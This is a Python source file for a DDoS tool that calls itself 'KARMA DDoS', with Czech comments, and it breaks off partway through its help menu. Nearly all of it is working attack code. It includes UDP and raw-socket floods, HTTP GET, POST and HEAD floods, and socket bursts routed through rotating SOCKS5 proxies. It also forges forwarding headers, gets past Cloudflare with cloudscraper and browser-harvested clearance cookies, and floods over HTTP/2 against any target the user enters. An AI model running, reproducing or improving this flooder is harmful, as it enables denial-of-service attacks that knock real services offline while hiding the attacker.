# -*- coding: utf-8 -*-
from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init


# ============================================================
# Globální konfigurace
# ============================================================
SOCKET_TIMEOUT = 5          # timeout pro socket operace (s)
BURST_PER_SOCKET = 50       # kolik requestů poslat na jeden socket


def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r " + Fore.MAGENTA + "[*]" + Fore.WHITE + " Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r " + Fore.MAGENTA + "[*]" + Fore.WHITE + " Attack Done !                                   \n")
            return


# region get
def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc.split(":")[0]
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
    return target


# ============================================================
# Načtení proxy – podporuje formát:
#   host:port
#   host:port:user:pass
# ============================================================
def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        stdout.write(Fore.MAGENTA + " [*]" + Fore.WHITE + " You Need Proxy File ( ./proxy.txt )\n")
        return False

    raw = open("./proxy.txt", 'r').read().split('\n')
    proxies = []
    for line in raw:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "://" in line:
            line = line.split("://", 1)[1]

        parts = line.split(":")
        if len(parts) == 2:
            host, port = parts
            user, pwd = None, None
        elif len(parts) == 4:
            host, port, user, pwd = parts
        else:
            continue
        try:
            int(port)
        except ValueError:
            continue

        proxies.append({
            "host": host,
            "port": int(port),
            "user": user,
            "pass": pwd,
        })

    if not proxies:
        stdout.write(Fore.MAGENTA + " [*]" + Fore.WHITE + " proxy.txt je prázdný nebo má špatný formát\n")
        return False

    auth_count = sum(1 for p in proxies if p["user"])
    stdout.write(Fore.MAGENTA + " [*]" + Fore.WHITE + f" Načteno {len(proxies)} proxy ({auth_count} s autentizací)\n")
    return True


def get_proxylist(type):
    """Ponecháno pro zpětnou kompatibilitu."""
    if type == "SOCKS5":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5").text
        os.makedirs("./resources", exist_ok=True)
        open("./resources/socks5.txt", 'w').write(r)
        return [x for x in r.rstrip().split('\r\n') if x.strip()]
    elif type == "HTTP":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
        os.makedirs("./resources", exist_ok=True)
        open("./resources/http.txt", 'w').write(r)
        return [x for x in r.rstrip().split('\r\n') if x.strip()]


def get_cookie(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
        '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging',
        '--disable-login-animations', '--disable-notifications', '--disable-gpu', '--headless',
        '--lang=ko_KR', '--start-maxmized',
        '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
        time.sleep(1)
    driver.quit()
    return False


def spoof(target):
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f'X-Forwarded-For: {spoofip}\r\n'
        f'Real-IP: {spoofip}\r\n'
    )


# ============================================================
# SOCKS5 socket s podporou user/pass autentizace
# ============================================================
def make_socks5_socket(proxy, target, use_ssl=True):
    s = None
    try:
        s = socks.socksocket()
        s.settimeout(SOCKET_TIMEOUT)
        if proxy.get("user"):
            s.set_proxy(
                socks.SOCKS5,
                proxy["host"],
                proxy["port"],
                username=proxy["user"],
                password=proxy["pass"],
            )
        else:
            s.set_proxy(socks.SOCKS5, proxy["host"], proxy["port"])
        s.connect((str(target['host']), int(target['port'])))
        if use_ssl and target['scheme'] == 'https':
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=target['host'])
        return s
    except Exception:
        try:
            if s:
                s.close()
        except Exception:
            pass
        return None


def make_direct_socket(target, use_ssl=True):
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(SOCKET_TIMEOUT)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        if use_ssl and target['scheme'] == 'https':
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=target['host'])
        return s
    except Exception:
        try:
            if s:
                s.close()
        except Exception:
            pass
        return None


def proxy_to_url(p):
    """Převede dict proxy na URL string pro requests/httpx."""
    if p.get("user"):
        return f"socks5://{p['user']}:{p['pass']}@{p['host']}:{p['port']}"
    return f"socks5://{p['host']}:{p['port']}"


def get_info_l7():
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "URL      " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "THREAD   " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "TIME(s)  " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    t = input()
    return target, thread, t


def get_info_l4():
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "IP       " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "PORT     " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    port = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "THREAD   " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "TIME(s)  " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    t = input()
    return target, port, thread, t
# endregion


# region layer4
def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def flooder(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(rand, (host, int(port)))
        except Exception:
            try:
                sock.close()
            except Exception:
                pass
            return


def runsender(host, port, th, t, payload=None):
    if not payload:
        payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until, payload))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (host, int(port)))
        except Exception:
            try:
                sock.close()
            except Exception:
                pass
            return
# endregion


# region METHOD

# region HEAD
def LaunchHEAD(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackHEAD, args=(url, until))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def AttackHEAD(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(url, timeout=SOCKET_TIMEOUT)
            requests.head(url, timeout=SOCKET_TIMEOUT)
        except Exception:
            pass
# endregion


# region POST
def LaunchPOST(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPOST, args=(url, until))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def AttackPOST(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.post(url, timeout=SOCKET_TIMEOUT)
            requests.post(url, timeout=SOCKET_TIMEOUT)
        except Exception:
            pass
# endregion


# region RAW
def LaunchRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackRAW, args=(url, until))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def AttackRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url, timeout=SOCKET_TIMEOUT)
            requests.get(url, timeout=SOCKET_TIMEOUT)
        except Exception:
            pass
# endregion


# region PXRAW
def LaunchPXRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXRAW, args=(url, until))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def AttackPXRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            p = random.choice(proxies)
            proxy_url = proxy_to_url(p)
            proxy = {'http': proxy_url, 'https': proxy_url}
            requests.get(url, proxies=proxy, timeout=SOCKET_TIMEOUT)
            requests.get(url, proxies=proxy, timeout=SOCKET_TIMEOUT)
        except Exception:
            pass
# endregion


# region PXSOC
def LaunchPXSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['uri'] + " HTTP/1.1\r\n"
    req += "Host: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXSOC, args=(target, until, req))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def AttackPXSOC(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = random.choice(proxies)
        s = make_socks5_socket(proxy, target)
        if s is None:
            continue
        try:
            for _ in range(BURST_PER_SOCKET):
                if (until_datetime - datetime.datetime.now()).total_seconds() <= 0:
                    break
                s.send(str.encode(req))
        except Exception:
            pass
        finally:
            try:
                s.close()
            except Exception:
                pass
# endregion


# region SOC
def LaunchSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['uri'] + " HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSOC, args=(target, until, req))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def AttackSOC(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        s = make_direct_socket(target)
        if s is None:
            time.sleep(0.1)
            continue
        try:
            for _ in range(BURST_PER_SOCKET):
                if (until_datetime - datetime.datetime.now()).total_seconds() <= 0:
                    break
                s.send(str.encode(req))
        except Exception:
            pass
        finally:
            try:
                s.close()
            except Exception:
                pass
# endregion


# region PPS
def LaunchPPS(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPPS, args=(target, until))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def AttackPPS(target, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        s = make_direct_socket(target)
        if s is None:
            time.sleep(0.1)
            continue
        try:
            for _ in range(BURST_PER_SOCKET):
                if (until_datetime - datetime.datetime.now()).total_seconds() <= 0:
                    break
                s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
        except Exception:
            pass
        finally:
            try:
                s.close()
            except Exception:
                pass
# endregion


# region NULL
def LaunchNULL(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['uri'] + " HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: null\r\n"
    req += "Referrer: null\r\n"
    req += spoof(target) + "\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackNULL, args=(target, until, req))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def AttackNULL(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        s = make_direct_socket(target)
        if s is None:
            time.sleep(0.1)
            continue
        try:
            for _ in range(BURST_PER_SOCKET):
                if (until_datetime - datetime.datetime.now()).total_seconds() <= 0:
                    break
                s.send(str.encode(req))
        except Exception:
            pass
        finally:
            try:
                s.close()
            except Exception:
                pass
# endregion


# region SPOOF
def LaunchSPOOF(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['uri'] + " HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSPOOF, args=(target, until, req))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def AttackSPOOF(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        s = make_direct_socket(target)
        if s is None:
            time.sleep(0.1)
            continue
        try:
            for _ in range(BURST_PER_SOCKET):
                if (until_datetime - datetime.datetime.now()).total_seconds() <= 0:
                    break
                s.send(str.encode(req))
        except Exception:
            pass
        finally:
            try:
                s.close()
            except Exception:
                pass
# endregion


# region PXSPOOF
def LaunchPXSPOOF(url, th, t, proxy):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['uri'] + " HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXSPOOF, args=(target, until, req))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def AttackPXSPOOF(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = random.choice(proxies)
        s = make_socks5_socket(proxy, target)
        if s is None:
            continue
        try:
            for _ in range(BURST_PER_SOCKET):
                if (until_datetime - datetime.datetime.now()).total_seconds() <= 0:
                    break
                s.send(str.encode(req))
        except Exception:
            pass
        finally:
            try:
                s.close()
            except Exception:
                pass
# endregion


# region CFB
def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except Exception:
            pass
# endregion


# region PXCFB
def LaunchPXCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def AttackPXCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            p = random.choice(proxies)
            proxy_url = proxy_to_url(p)
            proxy = {'http': proxy_url, 'https': proxy_url}
            scraper.get(url, proxies=proxy, timeout=SOCKET_TIMEOUT)
            scraper.get(url, proxies=proxy, timeout=SOCKET_TIMEOUT)
        except Exception:
            pass
# endregion


# region CFPRO
def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def AttackCFPRO(url, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False, timeout=SOCKET_TIMEOUT)
            scraper.get(url=url, headers=headers, allow_redirects=False, timeout=SOCKET_TIMEOUT)
        except Exception:
            pass
# endregion


# region CFSOC
def LaunchCFSOC(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req = 'GET ' + target['uri'] + ' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += 'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFSOC, args=(until, target, req))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def AttackCFSOC(until_datetime, target, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        s = make_direct_socket(target)
        if s is None:
            time.sleep(0.1)
            continue
        try:
            for _ in range(10):
                if (until_datetime - datetime.datetime.now()).total_seconds() <= 0:
                    break
                s.send(str.encode(req))
        except Exception:
            pass
        finally:
            try:
                s.close()
            except Exception:
                pass
# endregion


# region testzone
def attackSKY(url, timer, threads):
    for _ in range(int(threads)):
        th = threading.Thread(target=LaunchSKY, args=(url, timer))
        th.daemon = True
        th.start()


def LaunchSKY(url, timer):
    target = get_target(url)
    timelol = time.time() + int(timer)
    req = "GET / HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        proxy = random.choice(proxies)
        s = make_socks5_socket(proxy, target)
        if s is None:
            continue
        try:
            for _ in range(BURST_PER_SOCKET):
                if time.time() >= timelol:
                    break
                s.send(str.encode(req))
        except Exception:
            pass
        finally:
            try:
                s.close()
            except Exception:
                pass


def attackSTELLAR(url, timer, threads):
    for _ in range(int(threads)):
        th = threading.Thread(target=LaunchSTELLAR, args=(url, timer))
        th.daemon = True
        th.start()


def LaunchSTELLAR(url, timer):
    target = get_target(url)
    timelol = time.time() + int(timer)
    req = "GET / HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        s = make_direct_socket(target)
        if s is None:
            time.sleep(0.1)
            continue
        try:
            for _ in range(BURST_PER_SOCKET):
                if time.time() >= timelol:
                    break
                s.send(str.encode(req))
        except Exception:
            pass
        finally:
            try:
                s.close()
            except Exception:
                pass
# endregion


# region HTTP2
def LaunchHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        th = threading.Thread(target=AttackHTTP2, args=(url, until))
        th.daemon = True
        th.start()


def AttackHTTP2(url, until_datetime):
    headers = {
        'User-Agent': random.choice(ua),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            with httpx.Client(http2=True, timeout=SOCKET_TIMEOUT) as client:
                client.get(url, headers=headers)
                client.get(url, headers=headers)
        except Exception:
            pass


def LaunchPXHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        th = threading.Thread(target=AttackPXHTTP2, args=(url, until))
        th.daemon = True
        th.start()


def AttackPXHTTP2(url, until_datetime):
    headers = {
        'User-Agent': random.choice(ua),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            p = random.choice(proxies)
            proxy_url = proxy_to_url(p)
            with httpx.Client(
                http2=True,
                timeout=SOCKET_TIMEOUT,
                proxies=proxy_url,
            ) as client:
                client.get(url, headers=headers)
                client.get(url, headers=headers)
        except Exception:
            pass
# endregion


def test1(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req = 'GET ' + target['uri'] + ' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=test2, args=(until, target, req))
            thd.daemon = True
            thd.start()
        except Exception:
            pass


def test2(until_datetime, target, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        s = make_direct_socket(target)
        if s is None:
            time.sleep(0.1)
            continue
        try:
            for _ in range(10):
                if (until_datetime - datetime.datetime.now()).total_seconds() <= 0:
                    break
                s.send(str.encode(req))
        except Exception:
            pass
        finally:
            try:
                s.close()
            except Exception:
                pass


def clear():
    if name == 'nt':
        system('cls')
    else:
        system('clear')


##############################################################################################
def help():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 " + Fore.LIGHTWHITE_EX + "  ╦ ╦╔═╗╦  ╔═╗             \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "  ╠═╣║╣ ║  ╠═╝             \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "  ╩ ╩╚═╝╩═╝╩                \n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "        ══╦═════════════════════════════════╦══\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "layer7   " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Show Layer7 Methods                    " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "layer4   " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Show Layer4 Methods                    " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "tools    " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Show tools                             " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "credit   " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Show credit                            " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "exit     " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Exit KARMA DDoS                        " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "╠═════════════════════════════════════════════════════╣\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "THANK    " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Thanks for using KARMA.                " + Fore.LIGHTCYAN_EX + "║\n")
